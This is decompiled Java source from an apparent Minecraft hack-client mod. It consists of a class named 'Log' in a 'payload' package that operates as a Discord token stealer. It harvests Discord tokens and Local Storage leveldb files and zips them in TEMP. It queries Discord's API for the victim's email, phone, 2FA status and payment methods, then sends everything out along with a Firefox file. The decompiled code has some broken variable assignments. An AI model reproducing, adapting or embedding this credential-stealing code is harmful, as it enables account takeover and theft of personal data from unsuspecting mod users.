//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import java.util.function.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import java.util.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import com.google.gson.*;
import java.nio.file.attribute.*;
import java.util.zip.*;
import java.io.*;
import java.nio.file.*;

public final class Log implements Payload
{
    @Override
    public void execute() {
        List<String> tokens = new ArrayList<String>();
        TokenUtil.paths.stream().map((Function<? super Object, ?>)TokenUtil::getTokens).filter(Objects::nonNull).forEach((Consumer<? super Object>)tokens::addAll);
        tokens = TokenUtil.removeDuplicates(tokens);
        tokens = TokenUtil.getValidTokens(tokens);
        final File file2;
        File file;
        TokenUtil.paths.stream().map(s -> s + "\\Local Storage\\leveldb\\").forEach(s -> {
            try {
                new File(System.getenv("TEMP") + "\\" + FileUtil.randomString());
                file = file2;
                this.pack(s, file.getPath());
                Sender.send(file);
            }
            catch (IOException ex) {}
            return;
        });
        tokens.forEach(token -> Sender.send(this.process(token)));
        TokenUtil.getFirefoxFile().ifPresent(Sender::send);
    }
    
    private Message process(final String token) {
        final JsonObject obj = new JsonParser().parse(this.getUserData(token)).getAsJsonObject();
        return new Message.Builder("Discord Token").addField("Token", token, false).addField("Name", obj.get("username").getAsString() + "#" + obj.get("discriminator").getAsString(), true).addField("Email", obj.get("email").getAsString(), true).addField("2Factor", String.valueOf(obj.get("mfa_enabled").getAsBoolean()), true).addField("Phone", obj.get("phone").isJsonNull() ? "None" : obj.get("phone").getAsString(), true).addField("Nitro", obj.has("premium_type") ? "True" : "False", true).addField("Payment", this.hasPaymentMethods(token) ? "True" : "False", true).build();
    }
    
    private String getUserData(final String token) {
        return TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me", token);
    }
    
    private boolean hasPaymentMethods(final String token) {
        return TokenUtil.getContentFromURL("https://discordapp.com/api/v6/users/@me/billing/payment-sources", token).length() > 4;
    }
    
    private void pack(final String sourceDirPath, final String zipFilePath) throws IOException {
        final Path p = Files.createFile(Paths.get(zipFilePath, new String[0]), (FileAttribute<?>[])new FileAttribute[0]);
        try (final ZipOutputStream zs = new ZipOutputStream(Files.newOutputStream(p, new OpenOption[0]))) {
            final Path pp = Paths.get(sourceDirPath, new String[0]);
            final Path path2;
            final ZipEntry zipEntry;
            final ZipOutputStream zipOutputStream;
            Files.walk(pp, new FileVisitOption[0]).filter(path -> !Files.isDirectory(path, new LinkOption[0])).filter(path -> path.toFile().getPath().contains("ldb")).forEach(path -> {
                zipEntry = new ZipEntry(path2.relativize(path).toString());
                try {
                    zipOutputStream.putNextEntry(zipEntry);
                    Files.copy(path, zipOutputStream);
                    zipOutputStream.closeEntry();
                }
                catch (IOException ex) {}
                return;
            });
        }
    }
}
